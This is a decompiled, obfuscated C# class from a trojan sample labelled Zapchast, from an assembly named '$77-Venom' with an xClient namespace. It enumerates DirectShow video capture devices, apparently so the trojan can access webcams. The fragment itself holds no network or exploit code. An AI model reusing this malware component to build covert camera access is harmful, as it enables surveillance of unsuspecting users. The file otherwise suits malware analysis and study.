// Decompiled with JetBrains decompiler
// Type: 䓡赻庯䁔䅿괞ቝ㬑⧉ퟂ슢̔丶᪷蔘槵䛘縅
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;
using System.Collections;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using xClient.Core.AForge.Video.DirectShow;

public class 䓡赻庯䁔䅿\uE713괞ቝ㬑\u29C9ퟂ슢̔丶᪷蔘槵䛘縅\uF1C7 : CollectionBase
{
  public 䓡赻庯䁔䅿\uE713괞ቝ㬑\u29C9ퟂ슢̔丶᪷蔘槵䛘縅\uF1C7(Guid category) => this.멋㴵\uE8E7\uEF1C\uFBBF鍛\uE084ꐠ쒰឵푚\u2E21\u293Aᄩ쇶蠑\uF3FB驩ᒩꏲ(category);

  public FilterInfo this[int index] => (FilterInfo) this.InnerList[index];

  private void 멋㴵\uE8E7\uEF1C\uFBBF鍛\uE084ꐠ쒰឵푚\u2E21\u293Aᄩ쇶蠑\uF3FB驩ᒩꏲ(Guid category)
  {
    object o = (object) null;
    IEnumMoniker enumMoniker = (IEnumMoniker) null;
    IMoniker[] rgelt = new IMoniker[1];
    try
    {
      Type typeFromClsid = Type.GetTypeFromCLSID(轆뾯橍韎\uF178ᥜ\u1C90뎭됚C椲ۿ\u20A0伒涮렶\u25C9ꉮ䓫ꐇ.슡犻\uE6E2\uEAA8顮抴\uE355髙ﺫ֘清鶜꿨ᄆ篎羚軄莗\u2059鍄);
      o = !(typeFromClsid == (Type) null) ? Activator.CreateInstance(typeFromClsid) : throw new ApplicationException("Failed creating device enumerator");
      if (((嫻珦펤뺜芌䍆岉\u2D7E櫱忂\u31D7芜㐫撩\u281A봉쾆馳ꢈ䧞) o).CreateClassEnumerator(ref category, out enumMoniker, 0) != 0)
        throw new ApplicationException("No devices of the category");
      IntPtr zero = IntPtr.Zero;
      while (enumMoniker.Next(1, rgelt, zero) == 0 && rgelt[0] != null)
      {
        this.InnerList.Add((object) new FilterInfo(rgelt[0]));
        Marshal.ReleaseComObject((object) rgelt[0]);
        rgelt[0] = (IMoniker) null;
      }
      this.InnerList.Sort();
    }
    catch
    {
    }
    finally
    {
      if (o != null)
        Marshal.ReleaseComObject(o);
      if (enumMoniker != null)
        Marshal.ReleaseComObject((object) enumMoniker);
      if (rgelt[0] != null)
      {
        Marshal.ReleaseComObject((object) rgelt[0]);
        rgelt[0] = (IMoniker) null;
      }
    }
  }
}
